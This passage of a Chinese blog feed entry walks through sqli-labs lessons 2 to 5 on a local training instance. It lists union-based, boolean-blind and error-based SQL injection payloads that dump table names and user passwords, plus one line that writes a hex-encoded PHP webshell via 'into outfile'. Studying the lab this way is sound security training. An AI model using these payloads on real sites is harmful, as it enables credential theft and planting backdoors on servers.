src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183547570.png" alt="image-20220523183547570"></p><ul><li>payload</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema="security"#  #获取表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name="users" and table_schema="security"# #获取字段</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183959963.png" alt="image-20220523183959963"></p><h2 id="less-03"><a class="markdownIt-Anchor" href="#less-03">#</a> less 03</h2><ul><li>判断闭合方式为双引号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184413091.png" alt="image-20220523184413091"></p><ul><li>确定字段数时出现问题，发现后面有一个括号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184522961.png" alt="image-20220523184522961"></p><ul><li>经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   <code>?id=1') order by 4-+</code></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523184909069.png" alt="image-20220523184909069"></p><ul><li>判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185018507.png" alt="image-20220523185018507"></p><ul><li>payload：</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = "security"--+ #查表</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = "users" and table_schema = "security"--+ #获取字段名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185333709.png" alt="image-20220523185333709"></p><h2 id="less-04"><a class="markdownIt-Anchor" href="#less-04">#</a> less 04</h2><ul><li>测试注入点，发现这里还是有一个括号干扰</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185810035.png" alt="image-20220523185810035"></p><ul><li>最终发现注入点的 payload 为： <code>http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+</code></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523185933398.png" alt="image-20220523185933398"></p><ul><li>判断字段数</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190217849.png" alt="image-20220523190217849"></p><ul><li>判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190236849.png" alt="image-20220523190236849"></p><ul><li>payload：</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,database(),user()--+ #信息收集</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema="security"--+ #获取表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(column_name),user() from information_schema.columns where table_name="users" and table_schema="security"--+ #获取列名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190801049.png" alt="image-20220523190801049"></p><h2 id="less-05"><a class="markdownIt-Anchor" href="#less-05">#</a> less 05</h2><h4 id="1-布尔盲注使用left进行尝试"><a class="markdownIt-Anchor" href="#1-布尔盲注使用left进行尝试">#</a> 1、布尔盲注 —— 使用 left 进行尝试</h4><ul><li>利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523192616884.png" alt="image-20220523192616884"></p><ul><li>使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523192745236.png" alt="image-20220523192745236"></p><ul><li>使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)="s"--+</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)="se"--+</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>"se"--+ #使用ascii的值对字符进行判断</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523193121973.png" alt="image-20220523193121973"></p><h4 id="2-报错注入"><a class="markdownIt-Anchor" href="#2-报错注入">#</a> 2、报错注入</h4><ul><li>payload 如下，使用 updatexml 函数</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#获取当前数据库名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="token comment">#获取当前数据库所有表名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><span class="token comment">#获取当前数据库user表所有列名称</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+</span><span class="token comment">#获取当前数据库user表所有username和password的值</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+</span><span class="token comment">#下面这步写webshell</span>http:<span class="token comment">//192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>本关为无回显注入</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523190939410.png" alt="image-20220523190939410"></p><ul><li>判断闭合方式为单引号</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191042236.png" alt="image-20220523191042236"></p><ul><li>获取数据库</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191242131.png" alt="image-20220523191242131"></p><ul><li>获取表名</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191358718.png" alt="image-20220523191358718"></p><ul><li>获取字段名</li></ul><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523191518031.png" alt="image-20220523191518031"></p><ul><li>获取数据</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+</span><span class="token comment">#1依次加31即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523194258334.png" alt="image-20220523194258334"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;测试上线使用&lt;/p&gt;
&lt;p&gt;注意点：PHP 要使用低版本，高版本无法安装	&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;相关</summary>
      
    
    
    
    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="测试" scheme="http://example.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
